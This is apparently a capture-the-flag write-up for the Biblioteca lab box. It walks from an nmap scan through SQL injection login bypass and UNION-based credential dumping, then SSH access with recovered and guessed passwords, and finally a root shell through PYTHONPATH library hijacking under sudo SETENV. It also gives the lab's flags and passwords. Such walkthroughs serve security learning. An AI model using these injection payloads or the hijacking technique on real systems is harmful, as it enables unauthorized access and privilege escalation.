# Biblioteca CTF Writeup

## Target Information
- **IP Address:** 10.49.138.157
- **Operating System:** Linux (Ubuntu 20.04)

## Enumeration

### Nmap Scan
The initial scan identified two open ports:
- **22/tcp**: OpenSSH 8.2p1
- **8000/tcp**: Werkzeug httpd 2.0.2 (Python 3.8.10)

```bash
nmap -sC -sV -p- 10.49.138.157
```

### Web Enumeration
The service on port 8000 is a Python-based web application with login and registration functionality. 

## Exploitation

### SQL Injection
Testing the login form for SQL injection revealed that the `username` field was vulnerable. Using a simple payload allowed bypassing the login.

**Payload:** `admin'#`

By further exploiting this via `UNION SELECT`, the database structure and contents were dumped.

**Find Number of Columns:**
```bash
' UNION SELECT 1,2,3,4#
```
(Found 4 columns, with the 2nd column being reflected on the page).

**Dump Database Users:**
```bash
' UNION SELECT 1,group_concat(username,':',password),3,4 FROM users#
```

**Recovered Credentials:**
- `smokey:My_P@ssW0rd123`
- `hazel:test` (Web application password)

## Initial Access

### SSH as smokey
The credentials found for `smokey` worked for SSH.

```bash
ssh smokey@10.49.138.157
# Password: My_P@ssW0rd123
```

### Lateral Movement to hazel
The `/home` directory contained another user, `hazel`. Based on the challenge hint "Weak password", a common password check was performed. It was discovered that `hazel` used her own username as a password.

```bash
ssh hazel@10.49.138.157
# Password: hazel
```

**User Flag:** `THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}`

## Privilege Escalation

### Sudo Privileges
Checking sudo permissions for `hazel`:
```bash
hazel@ip-10-49-138-157:~$ sudo -l
User hazel may run the following commands on ip-10-49-138-157:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

The `SETENV` tag is critical here as it allows the user to set environment variables when running the command.

### Python Library Hijacking
The script `/home/hazel/hasher.py` imports the `hashlib` library. By setting the `PYTHONPATH` environment variable, we can force Python to look for libraries in a directory we control (like `/tmp`) before searching standard locations.

1. **Create a malicious library:**
```bash
echo 'import os; os.system("/bin/bash")' > /tmp/hashlib.py
```

2. **Execute the script with hijacked PYTHONPATH:**
```bash
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```

This resulted in a root shell.

**Root Flag:** `THM{PytH0n_LiBr@RY_H1j@acKIn6}`
